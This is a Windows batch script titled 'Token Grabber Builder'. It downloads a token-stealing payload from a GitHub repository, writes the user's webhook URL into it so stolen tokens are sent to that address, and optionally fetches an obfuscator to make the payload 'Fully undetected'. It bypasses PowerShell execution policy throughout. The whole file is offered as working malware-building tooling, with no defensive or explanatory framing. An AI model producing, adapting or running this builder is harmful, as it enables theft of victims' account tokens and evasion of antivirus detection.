@echo off
cd /d %~dp0
color 0a
title Token Grabber Builder
setlocal EnableDelayedExpansion

echo Bulid Options (1=bat, 2=ps1):
choice /C 12 /M "Select a build option:" /N

if %errorlevel% == 1 ( set "file=bat" ) else ( set "file=ps1" )

set "urled=https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.%file%"

echo Building bat file...
echo Downloading main.%file% from %urled%...
::now I could technically do ALL of this in batch but ion feel suicidal today
powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(Invoke-WebRequest -Uri '%urled%' -UseBasicParsing).Content | Set-Content main.%file%"

echo Enter webhook URL:
set /p url="URL: "

set "batch_path=%~dp0\main.%file%"

powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "(Get-Content %batch_path%) -replace 'YOUR_WEBHOOK_HERE', '%url%' | Set-Content %batch_path%"

echo Would you like to obfuscate and make it FUD (Fully undetected)? (y/n)
choice /C yn /M "Select an option:" /N

if %errorlevel% == 1 ( goto :obfuscate ) else ( goto :eof )

:obfuscate
echo Downloading Obfuscator. It requires python so if you don't have it, it won't work. The obfuscator link is https://github.com/somalifuscator. This ONLY WORKS for the batch file. Otherwise use Invoke-Obfuscation
timeout /t 7
rmdir /s /q somalifuscator
echo downloading somalifuscator
powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "Start-BitsTransfer -Source 'https://github.com/KDot227/Somalifuscator/archive/refs/heads/main.zip' -Destination 'somalifuscator.zip' -TransferType Download -Priority Foreground"
echo extracting somalifuscator
powershell.exe -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command "Expand-Archive somalifuscator.zip"
set "somalifuscator_path=%~dp0Somalifuscator\Somalifuscator-main"
del /f /q somalifuscator.zip
echo obfuscating
start %somalifuscator_path%\setup.bat
exit /b 0

echo finished
pause
goto :eof